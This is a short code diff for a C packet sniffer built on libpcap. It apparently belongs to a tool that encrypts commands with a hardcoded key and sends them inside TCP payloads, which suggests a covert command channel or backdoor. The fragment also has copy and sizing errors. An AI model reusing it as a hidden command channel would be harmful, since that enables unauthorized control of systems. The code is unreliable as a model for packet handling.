@@ -144,12 +144,12 @@ void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
     } else if(length < len){
         perror("Truncated IP");
         exit(1);
-    } else if((off & 0x1fff) == 0){
-        printf("IP: %s\n", inet_ntoa(ip->ip_src));
-        printf("%s %d %d %d %d\n", inet_ntoa(ip->ip_dst), hlen, version, len, off);
     } else if(ip->ip_p == IPPROTO_TCP){
         printf("Protocal: TCP\n");
         ParseTCP(args, pkthdr, packet);
+    } else if((off & 0x1fff) == 0){
+        printf("IP: %s\n", inet_ntoa(ip->ip_src));
+        printf("%s %d %d %d %d\n", inet_ntoa(ip->ip_dst), hlen, version, len, off);
     }
 
 }
@@ -204,7 +204,7 @@ void ParsePayload(const u_char *payload, int len){
 void CreatePayload(char *command, unsigned char *encrypted){
     struct payload p;
     unsigned char tcp_payload[sizeof(p)];
-    unsigned char ciphertext[sizeof(tcp_payload)];
+    unsigned char ciphertext[sizeof(struct payload)];
 
     strncpy(p.key, PAYLOAD_KEY, sizeof(PAYLOAD_KEY));
     strncpy(p.buffer, command, sizeof((char*) command));
@@ -212,7 +212,8 @@ void CreatePayload(char *command, unsigned char *encrypted){
     printf("Plaintext is: %s\n", tcp_payload);
     encryptMessage(tcp_payload, strlen((char*)tcp_payload) + 1, key,iv, ciphertext);
     printf("Ciphertext is: %s\n", ciphertext);
-    encrypted = ciphertext;
+    strncpy(encrypted, ciphertext, sizeof(ciphertext));
+    printf("Size of Ciphertext is: %d \n", sizeof(ciphertext));
 }
 
 void SendPayload(const unsigned char *tcp_payload){
